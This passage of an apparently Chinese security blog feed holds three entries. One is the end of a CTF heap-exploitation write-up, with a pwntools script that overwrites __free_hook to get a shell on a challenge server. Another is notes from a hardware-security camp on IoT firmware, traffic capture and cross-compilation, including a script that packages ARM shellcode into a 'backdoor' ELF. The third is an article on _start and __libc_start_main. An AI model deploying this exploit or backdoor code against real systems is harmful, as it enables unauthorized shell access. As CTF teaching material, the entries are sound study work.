class="line">    free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># one_gadget=libc_base + 0x4f322</span></span><br><span class="line"></span><br><span class="line">    io.sendline(<span class="string">&#x27;666&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x120</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x130</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x170</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x130</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    [free() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>)] <span class="comment">#fill tcache</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>) <span class="comment">#to unsortbin fd-&gt;arena</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x120</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x260</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x128</span>+p64(<span class="number">0x41</span>)+p64(free_hook-<span class="number">8</span>))<span class="comment">#overlap</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x130</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x130</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(system))</span><br><span class="line">    free()</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">25510</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pwn()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            io.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="0x04-总结-3"><a href="#0x04-总结-3" class="headerlink" title="0x04 总结"></a>0x04 总结</h4><p><code>realloc</code>函数的一些特点，才导致这道题目变得十分的特殊，当不对它<code>free</code>就直接再次调用<code>realloc</code>函数就会导致前一个堆块永远无法进入<code>bin</code>里面，这是需要十分注意的点！！！</p>]]></content>
      
      
      
        <tags>
            
            <tag> 刷题记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021HWS硬件安全在线夏令营总结</title>
      <link href="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/"/>
      <url>/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="Day1"><a href="#Day1" class="headerlink" title="Day1"></a>Day1</h2><h3 id="IOT"><a href="#IOT" class="headerlink" title="IOT"></a>IOT</h3><p>IOT是一个完整的信息系统，它包括软件和硬件两个组成部分，也PC不同的是，他们主要的业务就是操控硬件设备，其实IOT在每个人眼中都有不同的看法，人云亦云，对于软件开发者来说，IOT是业务，是设备的的业务实现，对于网络安全从业者来说，就是硬件设备，它硬件上有我们可攻击的漏洞</p><p>那么一个完整的IOT设备它应该有云端，设备硬件端 ，APP端，三个切入点</p><p>通常我们都是从设备端或者是APP端来进行攻击，那么关注设备端就是关注这个设备从开始到启动的全过程，就是bios -&gt; bootloader -&gt; 操作系统 -&gt; init.d -&gt; 业务</p><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/1-1633411916974.png" class=""><h3 id="固件"><a href="#固件" class="headerlink" title="固件"></a>固件</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>所谓”固件”，顾名思义，就是”固化在设备中的软件”，通常而言<strong>指的是 Flash 中被固化、执行固定功能的软件</strong>，需要注意的是固件是软件，是嵌入式设备中会被CPU所执行的代码</p><h4 id="固件的获取"><a href="#固件的获取" class="headerlink" title="固件的获取"></a>固件的获取</h4><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/2-1633411933096.png" class=""><h4 id="固件的解包"><a href="#固件的解包" class="headerlink" title="固件的解包"></a>固件的解包</h4><p>固件的解包一般有两种方法，binwalk和mount，binwalk在大多数情况下都管用，binwalk不管用的时候，mount可能会有奇效</p><p><strong>binwalk</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me *.bin <span class="comment">#递归提取</span></span><br><span class="line">binwalk -A *.bin <span class="comment">#识别架构</span></span><br><span class="line">binwalk -E *.bin <span class="comment">#熵值分析</span></span><br></pre></td></tr></table></figure><p><strong>mount</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir file_systems</span><br><span class="line">sudo mount ./rootfs.img file_systems</span><br></pre></td></tr></table></figure><h4 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h4><p>逆向分析的思路都是通用的</p><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/3-1633411945172.png" class=""><h6 id="分析攻击面"><a href="#分析攻击面" class="headerlink" title="分析攻击面"></a>分析攻击面</h6><p>输入就意味着存在着接口函数，既然有接口函数那就必然有实现的代码和相对应的硬件，但是需要注意的，我们分析IOT设备不是简单的read之类的输入，还包括很多物理世界的输入，比如USB口，网口等，这些输入都有可能成为一个IOT设备的攻击入口，所以多发散一下思维，没有什么是不可能的！</p><p>对于软件层面的分析，那分为两种情况，有shell和无shell，有shell，很好办了，查看一些它开启了哪些进程哪些服务，哪些端口，没有shell，就只能对它进行端口扫描了</p><h6 id="定位程序"><a href="#定位程序" class="headerlink" title="定位程序"></a>定位程序</h6><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/4-1633411966466.png" class=""><p>在前面我们通过收集IOT设备的信息后，我们就可以通过分析攻击的入口来定位，一般在查找的时候都是去查找厂商的二进制文件或者开源组件的漏洞</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>第一天的知识点还是比较基础的，从不同的角度阐述了IOT究竟是个什么玩意儿，它对于HWS来说有什么意义，对于不同的从业者来说又有什么意思，课程的后半部分就是在围绕着IOT中的一大基本要素——固件，所有的分析都是基于固件来分析的，所以说固件的提取和分析都是很关键的一环！拿到固件就像拿到IOT设备的蓝图，而后续的漏洞挖掘就是在探索地图当中那些神秘而又未知的宝藏！</p><h2 id="Day2"><a href="#Day2" class="headerlink" title="Day2"></a>Day2</h2><h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><p>流量分析中最重要的四个步骤”收，发，断，改”</p><p>收和发是流量中最基本的操作，在PWN中通过发送一些畸形的数据来使得程序的执行发生了一下非预期的结果，最终导致我们能够去做一些正常的操作所不能实现的东西</p><p>流量就像水流一样，流经哪里就可能会在某个地方留下一定的痕迹，如果我们在”水流”流动的过程中进行抓取，当然想要抓取更多更全面的信息，我们就得在”水流”的主干道上进行抓取，也就是在路由器干路侧放置抓包工具</p><p>所以当我们能够抓取到一些流量的时候，那必然可以进行断和改，就像我把”水流”中的水盛一碗上来，盛上来就是一个断的操作，接下来我在换一碗水再倒回去，便是改的操作</p><p>但是并不是所有的通信信道我们都可以去接入的，有一些信道是在内网当中的，我们不可能直接套用PWN的那一套，io.sendline()和io.recvuntil()，这不太可能做到，那就需要通过一下内网的边界进行介入，将外网的设备日穿，使得我们可以进入内网通信，这是一种外接内的情况，那还有一种内接外的情况，就是通过钓鱼邮件或者mqtt消息队列来进入内网通信，不多说，都是边界渗透的事</p><p>刚刚将的是现实生活中的抓，但我们不可能真的用手在空气中抓取通信报文，不太现实，所以一般我们都会通过树莓派刷上openwrt的代码，让树莓派变成一个小型的路由器，连接到干路进行抓取数据包</p><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/1-1633411985853.png" class=""><p>这里复现一下课上的实验——基于UDP信道的中间人攻击</p><p>先看看nc的参数</p><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/3-1633411997048.png" class=""><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-l<span class="comment">#监听模式，就是把nc当做一个server来看待，等待连接请求</span></span><br><span class="line">-p[port]<span class="comment">#端口号，可自定义</span></span><br><span class="line">-u<span class="comment">#使用UDP，默认是TCP</span></span><br><span class="line">-o[file]<span class="comment">#将传输过程中的数据以十六进制的形式保持到[file]中</span></span><br><span class="line">-s[addr]<span class="comment">#发送数据包的目的IP地址</span></span><br><span class="line">-w[time]<span class="comment">#设置超时的时间</span></span><br><span class="line">-z<span class="comment">#没有任何输入输出信息，用于扫描</span></span><br></pre></td></tr></table></figure><h3 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h3><p>软件被运行在调试底座，也就是gdbserver并在上面暴露出调试接口给调试器，也就是gdb，我们通过gdb发送一些调试命令对软件进行调试</p><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/2-1633412024242.png" class=""><p>既然要进行调试，那必然要暴露接口出来我们才可以进行调试，而这个接口也有很多种，UART，JTAG（Joint Test Action Group（联合测试行为组织，Coresight等等</p><h2 id="Day3"><a href="#Day3" class="headerlink" title="Day3"></a>Day3</h2><h3 id="交叉编译"><a href="#交叉编译" class="headerlink" title="交叉编译"></a>交叉编译</h3><p>交叉编译何为”交叉”？交叉就指的是不同的平台，就比如说我在<code>X86-64</code>平台下编译一个<code>ARM</code>架构的程序，就称之为交叉编译，与此对应的就是本地编译，可是为啥会有交叉编译这个概念呢？你本地编译不行吗？我还要再其他平台上编译，然后再送到你的平台上，费这么大劲干嘛？确实不行，由于嵌入式系统本身的原因，它所拥有的资源极其有限，它自己运行程序都够呛了，还给你编译，显然不太现实，所以才有了交叉编译</p><p>我们进行交叉编译的时候会用一个叫<code>arm-linux-gnueabi-gcc</code>，这包含了四个部分</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">arch [-vendor] [-kernel] [-system] [-language]</span><br><span class="line"></span><br><span class="line">-arch <span class="comment">#架构，编译出来是用于那个平台</span></span><br><span class="line">-vendor <span class="comment">#工具链的提供厂商，由厂商定义</span></span><br><span class="line">-kernel <span class="comment">#目标的操作系统</span></span><br><span class="line">-system <span class="comment">#所用的库函数,其中gnu等价于glibc+oabi,gnueabi等价于glibc+eabi</span></span><br><span class="line">-language <span class="comment">#编译语言，可以是gcc和g++</span></span><br></pre></td></tr></table></figure><p> 看似这一个很高级的命令就可以编译出来程序，但是其本质还是gcc的那一套，某个编译的参数不同</p><p>而<code>gcc</code>本质是一个工具包，但是这个工具包不只是单纯的是一个个分散的工具，它里面的工具与工具之间会形成一个联系，也就是后面介绍的工具链，<code>gcc</code>就像一个老大，有很多小弟帮他做事情，在平时编译程序的时候我们只需要<code>gcc -o xxx xxx.c</code>，就完成了编译，看似简单的背后，<code>gcc</code>替我们做的事情却不简单，我们来看一下<code>gcc</code>编译程序的流程</p><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/1-1633412058794.png" class=""><p>编译的阶段一共分为四个阶段：</p><ul><li>预处理（Preprocess）</li><li>编译（Compile）</li><li>汇编（Assemble）</li><li>链接（Link）</li></ul><p>一个阶段一个阶段来看</p><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/2-1633412080757.png" class=""><h4 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜ gcc -E hello.c -o hello.i</span><br></pre></td></tr></table></figure><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/8-1633412103083.jpg" class=""><p>经过预处理之后，我们打开文件之后看到一些宏定义还有函数的定义，这时我们的文件大小也变的特别大，就是因为预处理把<code>include</code>的包全部解析进来了</p><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/4-1633412119601.png" class=""><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/3-1633412125461.png" class=""><h4 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h4><p>接下来就是编译，编译就是将它转化成汇编代码并进行优化</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜ gcc -S hello.i -o hello.s</span><br></pre></td></tr></table></figure><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/5-1633412136616.png" class=""><h4 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h4><p>汇编器几乎是对着语句一句一句的进行转换，到这一步，我们的代码就已经形成了<code>ELF</code>文件的雏形，在汇编完成之后，这已经是一个<code>ELF</code>，但是拿去运行的时候并不能跑起来，从流程来看就是少了链接这个步骤，但这个步骤到底完成了什么呢？为什么没有它就不行呢？接下来慢慢介绍！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜ gcc -c hello.s -o hello.o</span><br></pre></td></tr></table></figure><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/6-1633412155310.png" class=""><h4 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h4><p>链接完成后就成为了一个可执行文件，那为什么要链接，程序员早期的代码都是写在一个文件当中的，但随着时间的迁移发现这样编写代码并不利于程序员管理代码，就演变出了各种文件来写不同的代码，所以当一个程序中需要用到其他程序中的函数的时候，链接就发挥了它的作用，它将此程序要用到的函数进行重定位，也就是做一个链接，让它能够顺利的调用这个函数，这就是链接！，打个比方就是再<code>hello</code>这个程序当中，有两个符号，一个是<code>main</code>，一个是<code>hello</code>，<code>main</code>函数很明显我们直接定义了，但是<code>printf</code>呢？很显然我们并没有写它的实现代码，对吧！可是为什么我能够调用它来打印<code>hello</code>呢？答案前面已经讲过了，前人已经帮我们写好了<code>printf</code>的实现代码，只需要通过链接将程序当中的<code>printf</code>的地址指向动态链接库的地址就能够调用了！</p><blockquote><p>在拼接（链接）所有目标文件的同时，编译器会确定各个函数加载到内存中的运行地址，然后 反过来修改所有调用该函数的机器指令，使得该指令能跳转到正确的内存地址。这个过程 就是重定位</p></blockquote><p>总之，用通俗一点的说就是把多个文件给它绑到一起，就叫链接！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜ gcc hello.o -o hello</span><br></pre></td></tr></table></figure><p>看完编译的过程，我们回头看看每个过程的由那些程序来完成的，前两个步骤，也就是预处理和编译是由<code>GNU GCC</code>来完成的，后面两个汇编和链接是由<code>GUN Binutils</code>来完成的，<code>Binutils</code>是个啥？它有两个程序组成，一个是汇编（as），一个是链接（ld），前面我们也看到了预处理➜编译➜汇编➜链接，每个过程都是一环接一环的，所以才有了编译工具链的概念</p><p>讲到这就有个疑问了，<code>Binutils</code>是个啥？</p><p><code>Binutils</code>的全称是<code>GNU Binary Utilities</code>，<code>GNU</code>二进制工具集合，所谓二进制就是一些0和1的数字，回忆上面的过程，想到汇编过后是不是整个程序就完全变了样，用编辑器打开都是一些十六进制的数字，所以<code>Binutils</code>就是对二进制的目标进行操控的一个工具集合</p><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/7-1633412170352.png" class=""><p>在上面我们知道<code>Binutils</code>主要有两个特别重要的工具：</p><ul><li><p><code>as</code></p><p>汇编器，把汇编代码转换成相对于的机器码</p></li><li><p><code>ld</code></p><p>链接器，将目标文件进行链接，形成一个可执行文件</p></li></ul><p><code>Binutils</code>还有其他次要的工具，但你一定用过的工具</p><ul><li><p><code>readelf</code></p></li><li><p><code>objdump</code></p></li><li><p><code>strings</code></p></li><li><p><code>strip</code></p><p>看完<code>gcc</code>的编译过程，作为一位攻击者，很多时候我们编译的都不是一个嵌入式的二进制文件，而是<code>shellcode</code>，所以除了用<code>arm-linux-gnueabi-gcc</code>之类的交叉编译工具来编译一个程序，还可以使用<code>pwntools</code>的<code>make_elf</code>来生成一个<code>shellcode</code>后门</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;arm&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;\x01\x60\x8f\xe2\x16\xff\x2f\xe1\x78\x46\x0a\x30\x01\x90\x01\xa9\x92\x1a\x0b\x27\x01\xdf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x00\x00&quot;</span></span><br><span class="line"></span><br><span class="line">backdoor  = make_elf(shellcode)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;backdoor&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">f.write(backdoor)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>运行上面的代码就得到了一个后门文件：</p><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/9-1633412183821.png" class="">]]></content>
      
      
      
        <tags>
            
            <tag> CTF培训 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>main真的是函数入口吗？</title>
      <link href="/2021/10/05/main%E7%9C%9F%E7%9A%84%E6%98%AF%E5%87%BD%E6%95%B0%E5%85%A5%E5%8F%A3%E5%90%97%EF%BC%9F/"/>
      <url>/2021/10/05/main%E7%9C%9F%E7%9A%84%E6%98%AF%E5%87%BD%E6%95%B0%E5%85%A5%E5%8F%A3%E5%90%97%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<blockquote><p>​        在我们开始学习C语言的时候，老师就跟我们讲”main函数就是程序开始执行的地方”，所有的代码都是从这里开始的，可事实真的是这样的吗？</p></blockquote><p>“所有”？这个词似乎有点以偏概全，如果main函数就是一切的开始，那么程序的堆栈，main函数传递的参数，I/O操作是凭空出现的吗？显然不是，是操作系统在main函数之前，就已经帮我们初始化好了一切，所以我们的main函数才能顺利执行，那么入口点不是main，那会是谁呢？我们可以编译一个静态的demo并对main函数进行交叉引用一下，可以发现它的名字叫<code>start</code>，当我们跟进去的时候，就能发现另一个新的世界！</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;welcome to exit\n&quot;</span>);</span><br><span class="line">     <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">     <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc exit.c -o exit -no-pie -static</span></span><br></pre></td></tr></table></figure><img src="/2021/10/05/main%E7%9C%9F%E7%9A%84%E6%98%AF%E5%87%BD%E6%95%B0%E5%85%A5%E5%8F%A3%E5%90%97%EF%BC%9F/1-1633405730636.png" class=""><p>在IDA里面可以看到<code>_start</code>的汇编，<code>_start</code>可以分为两个部分上半部分</p><p>上面的<code>_start</code>函数是<code>x86</code>下的（有做删减），下面的是<code>x86-64</code>，对比来看<code>x86</code>的就长了很多，原因是因为压栈的时候，不能直接将内存中的地址压入栈中，需要存到后寄存器再压入栈中，虽然长了点，但调用的本质都是一样的</p><ul><li><code>xor ebp,ebp</code>将<code>ebp</code>进行异或置为0完成对栈底指针的初始化，之后<code>pop esi</code>将<code>argc</code>弹出到<code>esi</code>中，因为再最开始初始化的时候就已经将<code>env,argv,argc</code>压入栈中，并且<code>esp</code>指向了<code>argc</code>的位置，之后就将<code>esp</code>进行异或<code>0FFFFFFF0h</code>，<code>esp</code>会根据当前的位置下降<code>0-15</code>个字节，为什么要这么做呢？目的是为了对齐，保证栈上所有的变量都能够被内存和<code>cache</code>快速的访问</li></ul><img src="/2021/10/05/main%E7%9C%9F%E7%9A%84%E6%98%AF%E5%87%BD%E6%95%B0%E5%85%A5%E5%8F%A3%E5%90%97%EF%BC%9F/2-1633405730636.png" class=""><blockquote><p><code>env</code>是系统的环境变量，包括系统的一些基本信息，所以<code>__environ</code>一直指向的一直都是栈上的地址，这就是为什么它能够泄露栈地址的原因，平时在路由器里面执行<code>printenv</code>的时候就能打印路由器的环境变量，这对于接下来的攻击也有很大的辅助作用</p></blockquote><ul><li><p>之后的语句就是压入<code>___libc_start_main</code>函数所需要的参数，为了字节对齐，压入的第一个参数<code>eax</code>只有对齐的效果，并没有使用到，下面的参数就是按照<code>__libc_start_main</code>的函数定义依次压入，<code>stack_end</code>是栈顶指针，<code>rtld_fini</code>动态加载有关的收尾工作，<code>init</code>为main调用前的初始化，<code>fini</code>为main函数结束之后的收尾工作 </p><p><code>__libc_start_main</code>在<code>libc-start.c</code>的文件里面，其函数定义如下</p></li></ul><blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __libc_start_main(  <span class="keyword">int</span> (*main) (<span class="keyword">int</span>, <span class="keyword">char</span> * *, <span class="keyword">char</span> * *),</span><br><span class="line">             <span class="keyword">int</span> argc, <span class="keyword">char</span> * * ubp_av,</span><br><span class="line">             <span class="keyword">void</span> (*init) (<span class="keyword">void</span>),</span><br><span class="line">             <span class="keyword">void</span> (*fini) (<span class="keyword">void</span>),</span><br><span class="line">             <span class="keyword">void</span> (*rtld_fini) (<span class="keyword">void</span>),</span><br><span class="line">             <span class="keyword">void</span> (* stack_end));</span><br></pre></td></tr></table></figure></blockquote><ul><li>当<code>___libc_start_main</code>正常执行的时候，会在<code>exit</code>处退出，而<code>hlt</code>的是为了保证程序在<code>___libc_start_main</code>调用失败的时候不会让程序一直在跑，它就是充当一个栅栏，强行把程序停下来.</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.text:08048340 _start          proc near               ; DATA XREF: LOAD:08048018↑o</span><br><span class="line">.text:08048340                 xor     ebp, ebp</span><br><span class="line">.text:08048342                 pop     esi</span><br><span class="line">.text:08048343                 mov     ecx, esp</span><br><span class="line">.text:08048345                 and     esp, 0FFFFFFF0h</span><br><span class="line">.text:08048348                 push    eax</span><br><span class="line">.text:08048349                 push    esp             ; stack_end</span><br><span class="line">.text:0804834A                 push    edx             ; rtld_fini</span><br><span class="line">.text:08048356                 lea     eax, (__libc_csu_fini - 804A000h)[ebx]</span><br><span class="line">.text:0804835C                 push    eax             ; fini</span><br><span class="line">.text:0804835D                 lea     eax, (__libc_csu_init - 804A000h)[ebx]</span><br><span class="line">.text:08048363                 push    eax             ; init</span><br><span class="line">.text:08048364                 push    ecx             ; ubp_av</span><br><span class="line">.text:08048365                 push    esi             ; argc</span><br><span class="line">.text:08048366                 mov     eax, offset main</span><br><span class="line">.text:0804836C                 push    eax             ; main</span><br><span class="line">.text:0804836D                 call    ___libc_start_main</span><br><span class="line">.text:08048372                 hlt</span><br><span class="line">.text:08048372 _start          endp</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400450 _start          proc near               ; DATA XREF: LOAD:0000000000400018↑o</span><br><span class="line">.text:0000000000400450 ; __unwind &#123;</span><br><span class="line">.text:0000000000400450                 xor     ebp, ebp</span><br><span class="line">.text:0000000000400452                 mov     r9, rdx         ; rtld_fini</span><br><span class="line">.text:0000000000400455                 pop     rsi             ; argc</span><br><span class="line">.text:0000000000400456                 mov     rdx, rsp        ; ubp_av</span><br><span class="line">.text:0000000000400459                 and     rsp, 0FFFFFFFFFFFFFFF0h</span><br><span class="line">.text:000000000040045D                 push    rax</span><br><span class="line">.text:000000000040045E                 push    rsp             ; stack_end</span><br><span class="line">.text:000000000040045F                 mov     r8, offset __libc_csu_fini ; fini</span><br><span class="line">.text:0000000000400466                 mov     rcx, offset __libc_csu_init ; init</span><br><span class="line">.text:000000000040046D                 mov     rdi, offset main ; main</span><br><span class="line">.text:0000000000400474                 call    cs:__libc_start_main_ptr</span><br><span class="line">.text:000000000040047A                 hlt</span><br><span class="line">.text:000000000040047A ; &#125; // starts at 400450</span><br></pre></td></tr></table></figure><p>删除大量的宏之后，留下了一些比较重要的函数，如下：</p><blockquote><p><code>atexit</code>函数有个特点，就是当<code>main</code>函数返回的时候才会执行</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">/* Result of the &#x27;main&#x27; function.  */</span></span><br><span class="line">  <span class="keyword">int</span> result;</span><br><span class="line">  <span class="keyword">char</span> **ev = &amp;argv[argc + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  __environ = ev;</span><br><span class="line"></span><br><span class="line">  __libc_stack_end = stack_end;</span><br><span class="line"><span class="comment">//=======================================</span></span><br><span class="line"></span><br><span class="line">  __pthread_initialize_minimal ();</span><br><span class="line"></span><br><span class="line">  __cxa_atexit ((<span class="keyword">void</span> (*) (<span class="keyword">void</span> *)) rtld_fini, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  __libc_init_first (argc, argv, __environ);</span><br><span class="line"></span><br><span class="line">  __cxa_atexit 